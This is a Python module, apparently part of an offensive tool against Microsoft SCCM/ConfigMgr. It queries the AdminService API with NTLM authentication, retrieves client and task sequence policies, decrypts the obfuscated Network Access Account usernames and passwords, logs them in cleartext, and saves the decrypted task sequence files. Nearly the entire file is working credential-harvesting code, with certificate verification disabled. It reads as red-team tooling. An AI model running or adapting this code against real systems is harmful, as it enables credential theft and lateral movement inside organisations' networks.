import requests
from requests_ntlm import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning
import xml.etree.ElementTree as ET
from lib.logger import logger

from Crypto.Cipher import AES,DES3
import hashlib
from hashlib import sha1
import binascii  
import math
import json
import argparse

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def aes_des_key_derivation(password):
    
    key_sha1 = sha1(password).digest()
    
    b0 = b""
    for x in key_sha1:
        b0 += bytes((x ^ 0x36,))
        
    b1 = b""
    for x in key_sha1:
        b1 += bytes((x ^ 0x5c,))

    b0 += b"\x36"*(64 - len(b0))
    b1 += b"\x5c"*(64 - len(b1))
        
    b0_sha1 = sha1(b0).digest()
    b1_sha1 = sha1(b1).digest()
    
    return b0_sha1 + b1_sha1 
    
def _3des_decrypt(data,key):

    _3des = DES3.new(key, DES3.MODE_CBC, b"\x00"*8)
    decrypted = _3des.decrypt(data)
    return decrypted.decode("utf-16-le")

def aes256_decrypt(data,key,iv=b"\x00"*16):

    aes256 = AES.new(key, AES.MODE_CBC, iv)
    decrypted = aes256.decrypt(data)
    return decrypted.decode("utf-16-le")

#thx @blurbdust https://github.com/blurbdust/PXEThief/blob/6d21293465959796c629e0a3517f1bb1655289b0/media_variable_file_cryptography.py#L80
def credential_string_algo(credential_string):
    hash_type = ""
    algo_bytes = credential_string[112:116]
    if algo_bytes == "1066":
        hash_type = "aes256"
    elif algo_bytes == "0366":
        hash_type = "3des"
    return hash_type
    
def deobfuscate_credential_string(credential_string):
    
    algo = credential_string_algo(credential_string)
    
    key_data = binascii.unhexlify(credential_string[8:88])
    encrypted_data = binascii.unhexlify(credential_string[128:])

    key = aes_des_key_derivation(key_data)
    last_16 = math.floor(len(encrypted_data)/8)*8

    if algo == "3des":
        last_16 = math.floor(len(encrypted_data)/8)*8
        return _3des_decrypt(encrypted_data[:last_16], key[:24])
    elif algo == "aes256":
        last_16 = math.floor(len(encrypted_data)/16)*16 
        return aes256_decrypt(encrypted_data[:last_16], key[:32])

class SPEAKTOTHEMANAGER:
    
    def __init__(self, target, username, password):
        self.target = target
        self.username = username
        self.password = password
        self.headers = {'Content-Type': 'application/json; odata=verbose'}
        
    def parse_xml(self, xml):
        #parses NAA and TS policies. NAAs are printed since they're static TS are saved becuase they're thicc
        root = ET.fromstring(xml)
        seen_naas = set()  # Track NAA credentials we've already printed
        seen_ts_hashes = set()  # Track task sequences we've already saved

        for elem in root.iter():
            if elem.get('class') == 'CCM_NetworkAccessAccount':
                # Collect username and password first
                username = None
                password = None

                for prop in elem.findall(".//*[@name='NetworkAccessUsername']"):
                    value = prop.find("value")
                    if value is not None and value.text:
                        username = deobfuscate_credential_string(value.text.strip())
                        username = username[:username.rfind('\x00')]

                for prop in elem.findall(".//*[@name='NetworkAccessPassword']"):
                    value = prop.find("value")
                    if value is not None and value.text:
                        password = deobfuscate_credential_string(value.text.strip())
                        password = password[:password.rfind('\x00')]

                # Only print if we haven't seen this username before
                if username and username not in seen_naas:
                    logger.info("[+] Found NAA Policy")
                    logger.info(f"[!] Network Access Account Username: {username}")
                    if password:
                        logger.info(f"[!] Network Access Account Password: {password}")
                    seen_naas.add(username)

            if elem.get('name') == 'TS_Sequence':
                value_elem = elem.find("value")
                if value_elem is not None and value_elem.text:
                    ts_data = value_elem.text.strip()
                    try:
                        ts_sequence = deobfuscate_credential_string(ts_data)
                        ts_hash = hashlib.md5(ts_sequence.encode()).hexdigest()

                        # Only save if we haven't seen this hash before
                        if ts_hash not in seen_ts_hashes:
                            logger.info("[+] Found Task Sequence policy")
                            # idk what the deal is but there's weird chars at the end so accept the jank
                            stripped_task_sequence = ts_sequence.split('</sequence>')[0] + '</sequence>'
                            logger.info("[!] successfully deobfuscated task sequence")
                            with open (f"ts_sequence_{ts_hash}.xml", 'w', encoding='utf-8') as f:
                                f.write(stripped_task_sequence)
                                logger.info(f"[+] task sequence policy saved to ts_sequence_{ts_hash}.xml")
                            seen_ts_hashes.add(ts_hash)
                    except Exception as e:
                        print(e)
                        pass
                    except:
                        pass


    def get_naa_policies(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage.GetClientConfigPolicies"
        response = self.http_request(url)
        json_response = response.json() 
        xml_content = (json_response['PolicyXmls'][0])
        self.parse_xml(xml_content)



    def get_ts_policy(self, ts_package_ids):
        # request the policy and call the parser to save the task sequence 
        url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage.GetTSPolicies"
        for package_id in ts_package_ids:
            try:
                body = {"PackageID" : f"{package_id}",
                        "AdvertisementID": "blah",
                        "AdvertisementName": "blah",
                        "AdvertisementComment": "blah",
                        "SourceSite" : "blah"
                        }
                response = self.http_request(url, body=body)
                if response:
                    response_json = response.json()
                    policy_xmls = response_json['PolicyXmls'][0]
                    self.parse_xml(policy_xmls)
                
            except Exception as e:
                    logger.info(e)        
    
    def get_ts_packages(self):
        # grab all the TS packages and build a list out of the IDs
        url = f"https://{self.target}/AdminService/wmi/SMS_TaskSequencePackage?$select=PackageID"
        response = self.http_request(url)
        if response:
            all_package_ids = []
            json_response = response.json()
            package_ids = json_response['value']
            for package in package_ids:
                package_id = package['PackageID']
                all_package_ids.append(package_id)
            return all_package_ids
        
    def http_request(self, url, body=None):
        try:
            r = requests.get(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers, json=body)
            if r.status_code == 401:
                logger.info("Got a 401 access denied. Your user may not have permissions on the AdminService API")
                return None
            elif r.status_code == 404:
                logger.info("Got a 404. Check your target argument.")
                return None
            else:
                return r
        except Exception as e:
            logger.info(e)
        
    
    def run(self):
        self.get_naa_policies()
        ts_package_ids = self.get_ts_packages()
        if ts_package_ids:
            self.get_ts_policy(ts_package_ids)
        return

